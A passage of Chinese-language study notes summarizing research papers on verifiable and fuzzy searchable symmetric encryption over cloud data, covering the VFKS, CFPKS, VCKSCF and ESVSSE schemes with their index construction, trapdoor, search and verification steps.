⋆ B'<sub>j<sub>b</sub></sub> = A<Sub>i</sub> ⋆ B<sub>j</sub>\n- 对于 AND 查询，如果 R<sub>i,j </sub> 每列中至少有一个整数，则输出1 ，否则输出0\n- 对于 OR 查询，如果 R<sub>i,j </sub> 至少有一个整数，则输出1，否则输出0\n\n- Remark 1：“除法”操作可能会导致搜索精度的降低，从而影响搜索精度。因此，1/3×3的结果可能是1.00001而不是1。为了解决这个问题，我们的方法是在小数点后的第 x 位进行四舍五入，x 可以在实验中调优。\n\n栗子🌰：\n\n- PIPE0的工作过程\n\n![PIPE0的工作过程](https://img.jwt1399.top/img/image-20220324145549054.png)\n\n- 由算法1和算法2输出的样本向量\n  - 云用户发出查询 Q<sub>1</sub> = {\"hel∗o\"，\"k∗y\"} 和 Q<sub>2</sub> = {\"hel∗o\"，\"w∗r∗d\"} 来检索适当的文件。\n  - 给定关键字最大长度 L= 5，随机素数 P = (3,5,7,11,13)，虚拟字符 S = (\"A\"， \"B\"， \"C\"， \"D\"， \"E\")，构建索引/查询向量，如下图所示。\n\n![](https://img.jwt1399.top/img/image-20220324145811133.png)\n\n为了说明向量编码算法的工作过程，我们以索引关键字 “key” 和查询关键字 “k∗y” 为例。\n\n- 在第一步中，将用字符 “A” 和 “B” 填充两个关键字，使其最大长度为 5\n- 在第二步中，两个 d 维向量 p<sub>key</sub> 和 q<sub>k∗y</sub> 被构造，并用 1 初始化。\n- 对于索引关键字 “key”，素数的倒数放置如下:\n  - 因为“k”是第一个字符，p<sub>key</sub>[F<sub>k<sub>f</sub></sub>(k)] 要乘以 1/3；\n  - 因为“e”是第二个字符，p<sub>key</sub>[F<sub>k<sub>f</sub></sub>(e)] 将被乘以 1/5;\n  - 因为“y”是第三个字符，p<sub>key</sub>[F<sub>k<sub>f</sub></sub>(y)] 将被乘以 1/7;\n  - 因为“A”是第四个字符，p<sub>key</sub>[F<sub>k<sub>f</sub></sub>(A)] 将被乘以 1/11;\n  - 因为“B”是第五个字符，p<sub>key</sub>[F<sub>k<sub>f</sub></sub>(B)] 要乘以 1/13。\n- 对于查询关键字 “k∗y”，素数的放置方式如下:\n  - 因为“k”是第一个字符，所以 q<sub>k∗y</sub>[F<sub>k<sub>f</sub></sub>(k)] 将乘以3;\n  - 由于“∗”是第二个字符，A 和 S 中的任意元素都可以位于这个位置，并且 q<sub>k∗y</sub>[F<sub>k<sub>f</sub></sub>(a)]，… ，q<sub>k∗y</sub>[F<sub>k<sub>f</sub></sub>(E)] 将乘以 5;\n  - 因为“y”是第三个字符，所以 q<sub>k∗y</sub>[F<sub>k<sub>f</sub></sub>(y)] 将乘以 7;\n  - 因为“A”是第四个字符，所以 q<sub>k∗y</sub>[F<sub>k<sub>f</sub></sub>(A)] 将乘以 11;\n  - 因为“B”是第五个字符，所以 q<sub>k∗y</sub>[F<sub>k<sub>f</sub></sub>(B)] 将乘以 13。\n\n由于素数的不可分解性质，p<sub>key</sub> · q<sub>k∗y </sub>的结果是一个整数(等于21)。结果与两个关键字相似是一致的\n\n上图所示的索引/查询向量，相应的样本矩阵如图[PIPE0的工作过程]-(b)所示\n\n- 如果 Q<sub>1</sub> 是一个 AND 查询，将返回 D<sub>1</sub>，因为只有 R<sub>1,1</sub> 在每列中有一个整数元素;\n- 如果 Q<sub>1</sub> 是一个 OR 查询，{D<sub>1</sub>, D<sub>2</sub>, D<sub>3</sub>} 将返回，因为 R<sub>1,1</sub>, R<sub>2,1</sub> 和 R<sub>3,1</sub> 至少有一个整数元素。\n- 如果 Q<sub>2</sub> 是一个 AND 查询，将返回 D<sub>3</sub>，因为只有 R<sub>3,2</sub> 在每列中有一个整数元素\n- 如果 Q<sub>2</sub> 是一个 OR 查询，{D<sub>1</sub>, D<sub>3</sub>} 将被返回，因为 R<sub>1,2</sub> 和 R<sub>3,2</sub> 至少有一个整数元素。\n\n## ⑧VFKS方案\n\n**论文名称：《Enabling Efficient Verifiable Fuzzy KeywordSearch Over Encrypted Data in Cloud Computing》**\n\n- 作者：葛新瑞; 贾宇; 胡成宇; 张汉林; 荣浩\n- 单位：青岛大学\n- 刊物：[IEEE Access](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/8438878)\n- 时间：2018年08月\n\n### 1、总体思路\n\n本文提出了**一种基于加密云数据的新型可验证模糊关键字搜索方案**（VFKS）。为了引入该方案，首先提出一个**可验证的确切关键字搜索方案**，然后将该方案扩展到**模糊关键字搜索方案**。在模糊关键字搜索方案中，采用**链表**作为安全索引，以实现高效存储。我们为每个关键字构造一个包含**三个节点的链表**，并为其生成一个**模糊关键字集**为了降低计算成本和存储空间，我们为每个模糊关键字集生成一个**索引向量**，而不是每个模糊关键字。为了抵御云服务器的恶意行为，为每个模糊关键字生成一个**身份验证标签**，以验证返回的密文的真实性。\n\n### 2、使用技术\n\n- PRF、PRP\n- MAC\n- 倒排索引\n- 编辑距离（Levenshtein）\n- 链表\n\n### 3、基础知识\n\n#### 安全索引\n\n数据所有者将普通索引加密为安全索引。他利用 PRP π 混淆关键字的重新分配，并利用 PRF f 模糊向量 v(w<sub>i</sub>)，即 π<sub>k1</sub>(w<sub>i</sub>) 和 Ev(w<sub>i</sub>)←f<sub>k2</sub>(πk1(w<sub>i</sub>)) ⊕ v(w<sub>i</sub>)。数据所有者调用算法 SKE.Enc 将文件 F 加密成密文 C 。使用 ID(C<sub>j</sub>) 表示加密文件 C<sub>j</sub> 的标识符\n\n#### PRF、PRP\n\n伪随机函数（PRF：pseudo random function）和伪随机置换函数（PRP：pseudo random permutation）是多项式时间可计算函数，任何概率多项式时间对手都无法将其与随机函数区分开来。\n\n文章中使用 **PRF f** 来加密索引向量(blind the index vectors )，使用 **PRP π** 来混淆关键字的位置。两个函数的参数如下：\n\n- π：{0,1}<sup>k</sup> × {0,1}<sup>l</sup> → {0,1}<sup>l</sup>\n- f： {0,1}<sup>k</sup> × {0,1}<sup>l </sup>→ {0,1}<sup>N</sup>\n- 其中 l 是关键字的最长长度。\n\n#### MAC\n\nMAC 是指消息认证码（带密钥的Hash函数），是密码学中通信实体双方使用的一种验证机制，保证消息数据完整性的一种工具。构造方法由 M.Bellare 提出，安全性依赖于 Hash 函数，故也称带密钥的 Hash 函数。消息认证码是基于密钥和消息摘要所获得的一个值，可用于数据源发送方认证和完整性校验。MAC 一般不会从头设计，而是从已有的哈希函数改造而来，比如加前缀、后缀或其他方法。\n\n- 设 MAC：{0,1}<sup>k</sup> × {0,1}<sup>∗</sup>→{0,1}<sup>N</sup> 是一个认证标签生成函数\n\n- 对于所选的消息攻击具有不可逆性和消息不可伪造性，我们用它为消息生成一个认证标签，并验证从云服务器返回的搜索结果的正确性。\n\n- 在本文中使用 tag = MAC(k<sub>0</sub>,m) 代替 tag = MAC(m)，其中 k<sub>0</sub> 为 key，m 为message\n\n#### 编辑距离\n\n编辑距离，也叫莱文斯坦距离(Levenshtein)，在模糊关键字搜索方案中，利用编辑距离来评估两个字符串的相似度。两个关键字 w<sub>1</sub> 和 w<sub>2</sub> 之间的编辑距离 (w<sub>1</sub>,w<sub>2</sub>) 是将其中一个转换为另一个所需的最小操作数。有三种基本操作\n\n- 替换：把一个字转换成另一个字。\n- 删除：从一个单词中删除一个字母。\n- 插入：在单词中插入一个字母。\n\n例如，将关键字 kitten 转换为关键字 sitting 的操作如下:\n\n- 1、kitten→sitten（k→s）\n- 2、sitten→sittin（e→i）\n- 3、sittin→sitting（insert g）\n\n一般来说，编辑距离越小，两个关键词的相似度越大\n\n### 4、方案1：VEKS\n\n#### K←KeyGen(1<sup>k</sup>)\n\n- sk←SKE.Gen(1<sup>k</sup>)\n  - SKE=(Gen,Enc,Dec)：文章中使用 AES\n\n- k<sub>0</sub>，k<sub>1</sub>，k<sub>2</sub>←{0,1}<sup>k</sup>\n- 算法输出秘钥 K = {sk，k<sub>0</sub>，k<sub>1</sub>，k<sub>2</sub>}\n- sk 为加解密文件的密钥，k<sub>0</sub> 为 MAC 的密钥，k<sub>1</sub> 为 PRP π 的密钥，k<sub>2</sub> 为 PRF f 的密钥\n\n#### (I,C)←BuildIndex(K,F)\n\n![](https://img.jwt1399.top/img/image-20220314172214410.png)\n\n- 1、数据所有者扫描整个文档，提取所有不同的关键字，构造关键字集 W。对于每个关键字 w<sub>i</sub> ∈ W(1≤i≤n)，数据所有者构造 F(w<sub>i</sub>)，它是一个包含 w<sub>i </sub>的文件集合。\n- 2、设 v(w<sub>i</sub>)(1≤i≤n) 表示关键字 w<sub>i </sub> 的索引向量。\n  - 如果 w<sub>i </sub> 在 F<sub>j</sub> (1≤j≤N) 中，则 v(w<sub>i </sub>)[j] = 1\n  - 否则, v(w<sub>i</sub>)[j] = 0\n\n- 3、数据所有者通过计算 C<sub>i</sub>←SKE.Enc<sub>sk</sub>(F<sub>i</sub>) 加密文档。然后生成关键字陷门 **π<sub>k<sub>1</sub></sub>(w<sub>i</sub>)**，通过计算 **Ev(w<sub>i</sub>)**←f<sub>k<sub>2</sub></sub>(π<sub>k<sub>1</sub></sub>(w<sub>i</sub>)) ⊕ v(w<sub>i</sub>) 来加密向量 v(w<sub>i</sub>)。\n- 4、数据所有者计算 **tag<sub>w<sub>i</sub></sub>**←MAC(π<sub>k<sub>1</sub></sub>(w<sub>i</sub>)，Ev(w<sub>i</sub>)，C<sub>i</sub>)，并将所有 tag<sub>w<sub>i </sub></sub>存储到 tag 表中\n- 5、最后，数据所有者将安全索引 I、密文 C 和 tag 表上传到云服务器\n\n#### T<sub>w'</sub>←Trapdoor(K,w')\n\n当用户需要搜索包含关键字 w' 的文档时，计算出陷门 T<sub>w'</sub> = (π<sub>k1</sub>(w')，f<sub>k2</sub>(π<sub>k1</sub>(w')))，并发送到云服务器\n\n#### ( tag<sub>w'</sub>,C(w'))←Search(T<sub>w'</sub>,C,I)\n\n- 云服务器根据 π<sub>k1</sub>(w') 在安全索引 I 中找到相关的加密向量 Ev(w')\n- 然后通过计算 v(w') ← f<sub>k2</sub>(π<sub>k1</sub>(w')) ⊕ Ev(w') 解密 Ev(w')\n- 如果 v(w')[j] = 1 (1≤j≤N)，云服务器将 C<sub>j</sub> 加到 C(w') 中\n- 同时，云服务器对 tag 表中 π<sub>k1</sub>(w') 位置提取 tag<sub>w'</sub>\n- 最后，云服务器将 C(w') 和 tag<sub>w' </sub>返回给数据用户。\n\n#### (accept,reject)←Verify(K,tag<sub>w'</sub>,C(w'),T<sub>w'</sub>)\n\n- 用户从 C(w') 中解析出 v(w') ，如果 C<sub>j</sub> 在 C(w') 中，则 v(w') 的第 j 位为 1，否则等于 0\n- 用户计算 Ev(w')←f<sub>k<sub>2</sub></sub>(π<sub>k1</sub>(w')) ⊕ v(w')\n- 然后检查 MAC(π<sub>k1</sub>(w')，Ev(w')，C(w')) 是否等于 tag<sub>w'</sub>，如果是则用户接受结果，否则拒绝结果。\n\n#### F(w')←Dec(K,C(w'))\n\n用户解密  C(w') 通过计算 F(w')←SKE.Dec<sub>sk</sub> (C(w'))\n\n### 5、方案2：VFKS\n\n#### KeyGen(1<sup>k</sup>)\n\n- sk←SKE.Gen(1<sup>k</sup>)\n- SKE = (Gen,Enc,Dec)，文章中使用 AES\n- k<sub>0</sub>，k<sub>1</sub>，k<sub>2</sub>←{0,1}<sup>k</sup>\n- 算法输出秘钥 K = {sk，k<sub>0</sub>，k<sub>1</sub>，k<sub>2</sub>}\n- sk 为加解密文件的密钥，k<sub>0</sub> 为 MAC 的密钥，k<sub>1</sub> 为 PRP π 的密钥，k<sub>2</sub> 为 PRF f 的密钥。\n\n#### BuildIndex(K,F)\n\n为了方便、高效地建立索引，文章通过**扩展倒排索引**来**构造包含三个节点的链表**作为**索引**。\n\n![](https://img.jwt1399.top/img/image-20220314184127075.png)\n\n- 1、数据所有者扫描整个文档，提取所有不同的关键字，构造关键字集 W。对于每个关键字 w<sub>i</sub> ∈ W(1≤i≤n)，数据所有者构造 F(w<sub>i</sub>)，它是一个包含 w<sub>i </sub>的文件集合。\n- 2、设 v(w<sub>i </sub>)(1≤i≤n)表示关键字 w<sub>i </sub> 的索引向量。\n  - 如果 w<sub>i </sub> 在 F<sub>j</sub> (1≤j≤N) 中，则 v(w<sub>i</sub>)[j] = 1\n  - 否则 v(w<sub>i</sub>)[j] = 0\n\n- 3、数据所有者为每个关键字 w<sub>i</sub> 构造模糊关键字集。 S<sub>w<sub>i,d</sub></sub> 表示有编辑距离的 w<sub>i</sub> 的模糊关键字集，w<sub>i,t</sub> (1≤i≤n,1≤t≤|S<sub>w<sub>i,d</sub></sub>|) 表示 S<sub>w<sub>i,d</sub></sub> 中的关键字\n- 4、数据所有者通过计算 C(w<sub>i</sub>) ← SKE.Enc<sub>sk</sub>(F(w<sub>i</sub>))加密所有文件。\n  - 对于 S<sub>w<sub>i,d</sub></sub> 中的每个模糊关键字，计算 π<sub>k<sub>1</sub></sub>(w<sub>i,t</sub>) (1≤i≤n,1≤t≤|S<sub>w<sub>i,d</sub></sub>|)，存储到**第一个节点**中\n  - 数据所有者计算 Ev(w<sub>i</sub>)←f<sub>k2</sub>(π<sub>k<sub>1</sub></sub>(w<sub>i</sub>)) ⊕ v(w<sub>i</sub>)，并将 Ev(w<sub>i</sub>) 存入**第二个节点**\n  - 对于 S<sub>w<sub>i,d</sub></sub> 中的所有模糊关键字，计算一个认证标签 tag<sub>w<sub>i,t</sub></sub> = MAC(π<sub>k<sub>1</sub></sub>(w<sub>i</sub>)，π<sub>k<sub>1</sub></sub>(w<sub>i,t</sub>)，Ev(w<sub>i</sub>)，C(w<sub>i</sub>))，存储到**第三个节点**中\n\n- 最后，数据所有者将这些链接列表存储到一个大数组中，该数组被视为安全索引 I\n\n#### Trapdoor(K,w')\n\n当用户需要搜索包含关键字 w' 的文档时，计算出陷门 T<sub>w'</sub> = ( π<sub>k<sub>1</sub></sub>(w')，f<sub>k<sub>2</sub></sub>(π<sub>k<sub>1</sub></sub>(w')) )，并发送到云服务器\n\n#### Search(T<sub>w'</sub>,C,I)\n\n- 当云服务器收到陷门后，将 π<sub>k<sub>1</sub></sub>(w') 与每个列表的第一个节点中的元素进行比较。\n- 在这里，我们使用加密的精确关键字 π<sub>k<sub>1</sub></sub>(w<sub>i</sub>) 表示第一个节点 π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>) 中的第一个元素。\n- 也就是说，w<sub>i,1</sub> 表示确切的关键字 w<sub>i</sub>。如算法1所示，我们用两种情况来描述这个过程。\n\n<img src=\"https://img.jwt1399.top/img/202205251027281.png\" style=\"zoom:67%;\" />\n\n- 情况1：\n  - π<sub>k<sub>1</sub></sub>(w') 不等于第一个节点上的第一个元素 π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>) ，而等于第一个节点上的另一个元素 π<sub>k<sub>1</sub></sub>(w<sub>i,t</sub>)(1<t≤|S<sub>w<sub>i,d</sub></sub>|)，此时，云服务器返回 π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>) 给数据用户\n  - 当用户接收到 π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>) 时，计算出 f<sub>k<sub>2</sub></sub>(π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>))，发送给云服务器\n  - 云服务器通过计算 v(w<sub>i</sub>) ← f<sub>k<sub>2</sub></sub>(π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)) ⊕ Ev(w<sub>i</sub>) 来解密第二个节点的 Ev(w<sub>i</sub>)\n  - 如果 v(w<sub>i</sub>)[j] = 1 云服务器将 C<sub>j</sub> 添加到 C(w')\n  - 然后云服务器从第三个节点的 π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)-th 位置提取 tag<sub>w'</sub>\n  - 最后，云服务器返回 C(w') 和 tag<sub>w' </sub>给数据用户。\n- 情况2：\n  - π<sub>k<sub>1</sub></sub>(w') 等于第一元素 π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)，云服务器通过计算 v(w<sub>i</sub>) ← f<sub>k<sub>2</sub></sub>(π<sub>k<sub>1</sub></sub>(w')) ⊕ Ev(w<sub>i</sub>) 直接解密第二个节点的 Ev(w<sub>i</sub>)。\n  - 如果 v(w<sub>i</sub>)[j] = 1 云服务器将 C<sub>j</sub> 添加到C(w')\n  - 然后云服务器从第三个节点的 π<sub>k<sub>1</sub></sub>(w')-th 位置提取 tag<sub>w'</sub>\n  - 最后，云服务器返回 C(w')，tag<sub>w'</sub>，π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)给数据用户\n\n#### Verify(K,tag<sub>w'</sub>,C(w'),π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>),T<sub>w'</sub>)\n\n- 用户从 C(w') 中提取出 v(w') 。\n- 如果 C<sub>j</sub> 在 C(w') 中，则 v(w') 的第 j 位为 1，否则等于0。\n- 用户计算 Ev(w') ← f<sub>k<sub>2</sub></sub>(π<sub>k<sub>1</sub></sub>(w')) ⊕ v(w')\n- 然后检查 MAC(π<sub>k<sub>1</sub></sub>(w<sub>i,1</sub>)，π<sub>k<sub>1</sub></sub>(w')，Ev(w')，C(w')) 是否等于 tag<sub>w'</sub>，如果是则用户接受结果，否则拒绝结果。\n\n#### Dec(K,C(w'))\n\n用户解密  C(w') 通过计算 F(w')←SKE.Dec<sub>sk</sub> (C(w')) (sk∈K)\n\n## ⑨CFPKS方案\n\n**论文名称：《Cuckoo-Filter Based Privacy-Aware Search over Encrypted Cloud Data》**\n\n- 作者：薛清寒；Mooi Choo Chuah\n- 单位：Lehigh University\n- 会议：[2015 11th International Conference on Mobile Ad-hoc and Sensor Networks (MSN)](https://ieeexplore.ieee.org/document/7420926)【CCF C】\n- 时间：2015年12月\n\n### 1、总体思路\n\n提出了**一种基于布谷鸟过滤器的私有关键字搜索方案（CFPKS）**，以对加密数据提供隐私感知关键字搜索。该 CFPKS 方案使用基于**B<sup>ed</sup>-tree 结构**的索引来**提高搜索效率**，使用**通配符**方法支持模糊关键字搜索，并使用 **Cuckoo 过滤器**来提高搜索准确性和存储效率。方案可以处理拼写错误和**查询不可链接性**。\n\n本文的主要贡献归纳如下:\n\n- 1.我们提出了一种基于布谷鸟过滤器的私有关键字搜索方案（CFPKS），该方案支持**多词关键字搜索**，具有高搜索精度和高效存储;\n- 2.方案旨在处理查询中的拼写错误，并通过生成不同的加密搜索请求来提供查询不可链接性，即使使用相同的关键字搜索;\n\n### 2、使用技术\n\n- B<sup>ed</sup>-tree\n- wildcard\n- 布谷鸟过滤器\n\n### 3、相关说明\n\n#### 相似度关键字搜索\n\n- 给定一个加密文件集合 F = {F<sub>1</sub>，F<sub>2</sub>，···}，一组不同的单词 W = {w<sub>1</sub>，w<sub>2 </sub>,···, w<sub>p</sub>} 和预定义的编辑距离阈值 d\n- 相似度搜索时，如果 ED(v<sub>wi</sub>,v<sub>wj</sub>) <= d，则返回一组包含单词 wi 的文件标识符\n- w<sub>i</sub> 是数据库中存储的单词，其数据向量为 v<sub>wi</sub>\n- w<sub>j</sub> 是查询中的单词，其数据向量为 v<sub>wj</sub>\n\n![](https://img.jwt1399.top/img/image-20220408011217852.png)\n\n#### 布谷鸟过滤器\n\n一种实用的数据结构，它比相同存储大小的计数过滤器和传统的布隆过滤器具有更好的搜索精度和搜索时间。它由一个桶数组组成，每个桶包含多个条目。\n\n对于每个数据项 x，哈希方案计算两个候选桶 i1 和 i2 的索引，设 Fingerprint(x) 为 hash(x) 的最小 k bit\n\n```python\n# Trunc(hash(x),k) 计算hash(x)的最小 k 位。\nFingerprint(x) = Trunc(hash(x),k) \nf = Fingerprint(x)\ni1 = hash(x) mod M\ni2 = (i1 ⊕ hash(f)) mod M\n```\n\n#### B<sup>ed</sup>-tree结构\n\n构造了一个含两个层次 B<sup>ed</sup>-tree 型索引结构，每个中间节点代表一个叶节点集群与单词在特定字符串的间隔，即每个中间节点包含数据的上下边界向量(表示为 lb[m] 和 ub[m] (for 1≤m≤L))的所有叶节点下。\n\n- 每个 B<sup>ed</sup>-tree 的叶节点包含一个数据向量和 hash(w)\n\n- 一个布谷鸟过滤器，它包含的单词的编辑距离为 d 到 w，以及包含单词 w 的加密文件标识符列表。\n\n- 查询词将按 N-gram 顺序转换为向量 v<sub>q</sub>，使用 ED 计算公式搜索每个中间节点的 lb[m] 和 ub\\[m](1≤m≤L)，判断是否需要搜索该中间节点下的子节点。\n\n随着允许的约束区间的增加(即中间节点的减少)， B<sup>ed</sup>-tree 结构的构建成本降低，但由于每个中间节点将附加更多的叶节点，搜索成本将增加\n\n![L buckets for n-gram insertion](https://img.jwt1399.top/img/202205251027136.png)\n\n### 4、方案实现\n\n![](https://img.jwt1399.top/img/image-20220407105531319.png)\n\n#### Setup\n\n在初始化阶段，数据所有者生成密钥 SK，SK 由两部分组成\n\n-  (L+1)×(L+1) 随机矩阵 R，R 用于提供查询不可链接功能\n- 四个随机变量 a、b、N、k\n- SK = {R，a，b，N，k}\n\n#### GenIndex(L,I,SK,M,e)\n\n设需要构造加密索引树的关键字集合 I = {I<sub>1</sub>,I<sub>2</sub>}，其中 I<sub>1 </sub>用于构造第一层类别节点，I<sub>2</sub> 用于构造附属的 B<sup>ed</sup>-tree 结构。选择 SHA-256 作为我们的**键控哈希函数**。此外，使用 L-element 数据向量和 M-bucket 布谷鸟过滤器，每个桶中有 e 个条目\n\n- 对于每个包含关键字 CA<sub>i</sub> 的类别节点，CA<sub>i</sub> ∈ I<sub>1</sub>，所有者将 CA<sub>i</sub> 的哈希值的最低 k 位插入索引树第 1 层的 M-bucket 布谷鸟过滤器中\n- 对于每个叶子节点包含关键字 kw<sub>i</sub>，其中 kw<sub>i</sub> ∈ I<sub>2</sub>，所有者通过 IndVec(N, kw<sub>i</sub>) 函数生成 V(kw<sub>i</sub>)。然后计算EncVec(kw<sub>i</sub>) = (V(kw<sub>i</sub>),1) × R，其中随机秘密矩阵R的元素 ∈ [1,L]\n  - IndVec(N,w)：通过 N-gram 计数顺序计算单词 w 的 L-bucket 数据向量 V(w)。\n\n- 对于每个 kw<sub>i</sub>，所有者计算一个行向量 EncHash(kw<sub>i</sub>) = [1/(a\\*hash(kw<sub>i</sub>))， 1/(b*hash(kw<sub>i</sub>))]\n\n- 所有者生成一个集合 T<sub>i</sub> = {w<sub>i1</sub> ,···, w<sub>ij</sub>···}，其中 w<sub>ij</sub> 为 kw<sub>i</sub> 的单错字。对于每个元素 w<sub>ij</sub>，将其哈希值的最低 k 位插入到 M-bucket 布谷鸟过滤器中\n\n- 加密的数据向量 EncVec(kw)、加密的哈希向量 EncHash(kw)、M-bucket 布谷鸟过滤器和加密的文件标识符存储在叶子节点中。然后，利用 B<sup>ed</sup>-tree 构造过程，计算出存储的所有关键字的数据向量，构造加密索引树 EncSK(I)。\n\n#### GenQuery(L,Q,SK)\n\n为了提供查询不可链接性，我们需要生成一个不同的加密查询，即使是使用相同的关键字。大小为 (L+1)×L 的排列矩阵 P，其中 L 是数据向量的长度，用于提供该特征。对于 P 的前 L 行，每一行只有一个非零元素。P的最后一行包含值为 1 或 -1 的元素\n\n- 给定一个查询 Q = {Ca<sub>q</sub>,kw<sub>q</sub>}，其中 Ca<sub>q</sub> 是 category 关键字，数据用户首先生成一个随机散列值，表示为\n\n  RH(Caq)) = {hash(Ca<sub>q</sub>) + 2k*γ}，其中 γ 是一个随机偶数\n\n- 然后数据用户生成 P，并构造大小为 (L+1)×L 的 P'，它在第 1 个 L 行中具有与 P 相同的元素。P' 的最后一行是由 P 的最后一行与标量值 α 相乘得到的，其中 α ∈ [1,L]。接下来，数据用户还计算(R<sup>−1</sup> × P')\n\n- 对于每个 kw<sub>q</sub>，数据用户生成其数据向量 V(kw<sub>q</sub>)，然后用 (V(kw<sub>q</sub>)，α))乘以 P\n\n- 再生成 hash(kw<sub>q</sub>)，然后，他将 hash(kw<sub>q</sub>) 拆分为两个随机值 {hash(kw<sub>q</sub>)'，hash(kw<sub>q</sub>)\"}，这样 hash(kw<sub>q</sub>) = hash(kw<sub>q</sub>) ' +hash(kw<sub>q</sub>)\"。接下来，数据用户计算列向量\n\n  ![](https://img.jwt1399.top/img/202205251027022.png)\n\n  - 其中 g<sub>1</sub> = a\\*(hash(kw<sub>q</sub>)') 和 g<sub>2</sub> = b\\*(hash(kw<sub>q</sub>)\")。即使关键字是相同的，这个 MH(kw<sub>q</sub>) 向量将是不同的，因此提供关键字不可链接\n\n- 数据用户还生成一个集合 t<sub>q</sub>= {q<sub>1</sub>，···，q<sub>i</sub>，···}，其中 q<sub>i </sub> 是 kw<sub>q</sub> 的单错别字。对于每个元素 q<sub>i </sub>，生成 RH(q<sub>i</sub>) = {hash(q<sub>i</sub>) + 2k*γ}，其中 γ 是一个随机偶数。这一步确保相同的 q<sub>i</sub> 会产生不同的 RH(q<sub>i</sub>)，因此提供了模糊关键字集合中任何单词的不可链接性\n- 最后将加密搜索请求 EncSK(Q) = { RH(Ca<sub>q</sub>)，(V(kw<sub>q</sub>),α) × P，(R<sup>−1</sup>×P')， MH(kw<sub>q</sub>)，RH(t<sub>q</sub>) }，其中RH(t<sub>q</sub>)={RH(q<sub>1</sub>)，···，RH(q<sub>i</sub>)，···} 提交给云服务器。\n\n#### Search(EncSK(I),EncSK(Q))\n\n![](https://img.jwt1399.top/img/202205251027255.png)\n\n- 服务器首先检查存储在第一级节点的 M-bucket 布谷鸟过滤器中是否存在任何最低 k 位 hash 的 RH(Ca<sub>q</sub>)。\n- 如果找到，则从最匹配的类别节点中，云服务器在 bed-tree 结构中找到一个合适的第一个节点 im(i)，并沿着节点 im(i) 下的叶子节点进行搜索，如下所示:\n  - 云服务器首先将 (V(kw<sub>i</sub>),1) × R 与 (R<sup>−1 </sup>× P') 相乘。然后它将计算 (V(kw<sub>q</sub>),1) × P' 和 (V(kw<sub>q</sub>),α) × P 之间的编辑距离使用 ED 计算公式\n  - 如果 ED((V(kw<sub>q</sub>),1) × P'， (V(kw<sub>q</sub>),α) × P) ≤ 编辑距离阈值 d，则云服务器将比较存储在叶节点中的加密哈希值\n\n![](https://img.jwt1399.top/img/image-20220407160519071.png)\n\n如果存在匹配 Com(EncHash(kw<sub>i</sub>)，MH(kw<sub>q</sub>)) == 1，则返回存储在该节点中的文件标识符。\n\n如果没有精确的匹配，则服务器判断存储的叶节点的 M-bucket 布谷鸟过滤器中是否存在最小 k 位的 RH(q<sub>i</sub>) 哈希值。如果找到，则服务器将检索匹配节点中的加密文件标识符，并将它们返回给数据用户。\n\n\n\n##  ~~⑩VCKSCF方案~~\n\n**论文名称：《VCKSCF: Efficient Verifiable Conjunctive Keyword Search Based on Cuckoo Filter for Cloud Storage》**\n\n- 作者：陈凡；董小磊；曹振富；沈家辰\n- 单位：上海市可信计算重点实验室、华东师范大学\n- 会议：[TrustCom](https://ieeexplore.ieee.org/document/9343045)【CCF C】\n- 时间：2021年12月\n\n### 1、总体思路\n\n提出了一种基于 Cuckoo 过滤器 (VCKSCF) 的可验证连接关键字搜索方案，该方案显着降低了验证和存储开销。安全性分析表明，该方案在面临选择关键字攻击下的不可区分性以及证明和搜索令牌的不可伪造性时实现了安全性。\n\n本文的主要贡献归纳如下:\n\n- 1.通过 Cuckoo 过滤器 (VCKSCF) 构建了一个高效且可验证的连接关键字搜索方案。创新策略产生更少的计算和存储开销\n- 2.通过在服务器端采用特定的矩阵作为存储结构来保护最不频繁关键字的隐私，其中每个最不频繁关键字的位置由其左右部分确定\n- 3.我们给出了正式的安全分析来证明我们的方案实现了IND-CKA安全，搜索令牌和特定关键字查询的证明是不可伪造的。在真实数据库中的实验表明，我们的方案具有较低的通信成本和优化的效率\n\n**由于本篇论文采用公钥密码实现，故不再深入。。。**\n\n## ⑪ESVSSE方案\n\n**论文名称：《ESVSSE: Enabling Efficient, Secure, Verifiable Searchable Symmetric Encryption》**\n\n- 作者：石振奎;傅雪梅;李贤贤;朱凯\n- 单位：广西师范大学\n- 会议：[IEEE Transactions on Knowledge and Data Engineering](https://ieeexplore.ieee.org/document/9201320)【CCF A】\n- 时间：2020年09月\n\n### 1、总体思路\n\n本文提出了一种基于 **B<sup>+</sup>-Tree** 和**计数布隆过滤器** (CBF) 的高效 **SSE** 方案，该方案支持安全验证、动态更新和多用户查询。与之前的最新技术相比，我们设计了新的数据结构 CBF，以支持**动态更新**和**增强验证**。我们通过综合实验评估我们的方案。结果与我们的分析一致，表明我们的方案是安全的，并且与以前具有相同功能的方案相比更有效。当搜索关键字的缺失率为 20% 时，云服务器和用户的平均性能可以提高 20% 左右。并且丢失率越高，性能可以提高的越多。\n\n### 2、使用技术\n\n- B<sup>+</sup>-Tree\n- 计数布隆过滤器(CBF)\n\n### 3、方案概述\n\n#### 密钥生成\n\nGen(1<sup>k</sup>) → {K<sub>1</sub>，K<sub>2</sub>，K<sub>3</sub>，(ssk,spk)}\n\n- 输入：安全参数 k \n- 输出：私有密钥 K<sub>1</sub>，K<sub>2</sub>，K<sub>3</sub> ，随机签名密钥对(ssk,spk)\n\n#### 初始化\n\nInit(K<sub>1</sub>，K<sub>2</sub>，K<sub>3</sub>，ssk，D) → {I，π，π<sub>bf</sub>，C}\n\n<img src=\"https://img.jwt1399.top/img/202206211855497.png\" style=\"zoom:50%;\" />\n\n- 输入：\n  - 密钥 K<sub>1</sub>，K<sub>2</sub>，K<sub>3</sub>，签名私钥 ssk ，文档集 D \n  - 伪随机函数 *F*、*G*： {0,1}<sup>k</sup> x {0,1}<sup>*</sup> → {0,1}<sup>\\*</sup>\n  - 哈希函数 *IH*： {0,1}<sup>*</sup> → {0,1}<sup>k</sup>\n- 输出：\n  - 基于 B<sup>+</sup>-Tree 的安全索引 I，加密文档 C，认证器 π 和 CBF 的认证器 π<sub>bf</sub>\n  - π<sub>bf</sub> 